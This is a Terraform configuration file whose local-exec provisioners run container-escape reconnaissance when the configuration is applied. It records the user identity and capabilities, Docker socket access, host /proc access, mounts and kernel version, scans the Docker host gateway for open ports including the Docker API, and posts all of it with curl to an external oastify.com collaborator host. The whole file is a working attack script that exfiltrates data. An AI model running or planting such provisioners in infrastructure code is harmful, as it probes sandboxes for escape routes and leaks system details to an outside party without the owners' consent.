# main.tf - Get Detailed Escape Results
resource "null_resource" "escape_results" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CONTAINER ESCAPE RESULTS ===" > /tmp/escape_results.txt
      
      # 1. Privilege and capability results
      echo "=== PRIVILEGES ===" >> /tmp/escape_results.txt
      whoami >> /tmp/escape_results.txt
      id >> /tmp/escape_results.txt
      cat /proc/self/status | grep -i cap >> /tmp/escape_results.txt 2>/dev/null
      
      # 2. Docker socket results
      echo "=== DOCKER SOCKET ===" >> /tmp/escape_results.txt
      ls -la /var/run/docker.sock 2>/dev/null >> /tmp/escape_results.txt || echo "No docker socket" >> /tmp/escape_results.txt
      
      # 3. Host service scan results
      echo "=== HOST SERVICES ===" >> /tmp/escape_results.txt
      for port in 22 80 443 2375 2376 8080 9000; do
        timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$port" 2>/dev/null && echo "Port $port open on host" >> /tmp/escape_results.txt || true
      done
      
      # 4. Proc escape results
      echo "=== PROC ESCAPE ===" >> /tmp/escape_results.txt
      ls /proc/1/root/ 2>/dev/null && echo "Host proc accessible" >> /tmp/escape_results.txt || echo "No host proc access" >> /tmp/escape_results.txt
      
      # 5. Mount results
      echo "=== MOUNTS ===" >> /tmp/escape_results.txt
      mount | grep -v tmpfs | grep -v cgroup >> /tmp/escape_results.txt
      
      # 6. Kernel info
      echo "=== KERNEL ===" >> /tmp/escape_results.txt
      uname -a >> /tmp/escape_results.txt
      
      # Send the full results
      curl -X POST --data-binary @/tmp/escape_results.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/escape_results
      
      echo "Escape results sent"
    EOT
  }
}

resource "null_resource" "critical_evidence" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CRITICAL EVIDENCE SUMMARY ==="
      
      # Check for the most critical findings
      CRITICAL=false
      
      # 1. Docker socket access
      if [ -w /var/run/docker.sock ]; then
        echo "CRITICAL: Docker socket writable"
        CRITICAL=true
      fi
      
      # 2. Privileged container
      if [ -w /dev/kmsg ]; then
        echo "CRITICAL: Privileged container"
        CRITICAL=true
      fi
      
      # 3. Host proc access
      if [ -d /proc/1/root ]; then
        echo "CRITICAL: Host proc filesystem accessible"
        CRITICAL=true
      fi
      
      # 4. Docker API exposed
      if timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/2375"; then
        echo "CRITICAL: Docker API exposed on host"
        CRITICAL=true
      fi
      
      # 5. SYS_ADMIN capability
      if capsh --print 2>/dev/null | grep -q sys_admin; then
        echo "CRITICAL: SYS_ADMIN capability"
        CRITICAL=true
      fi
      
      if [ "$CRITICAL" = true ]; then
        echo "CONTAINER ESCAPE POSSIBLE - CRITICAL IMPACT"
        curl -X POST -d "container_escape_possible=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/critical_finding
      else
        echo "No container escape vectors found"
        curl -X POST -d "container_escape_not_found=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/no_escape
      fi
    EOT
  }
}
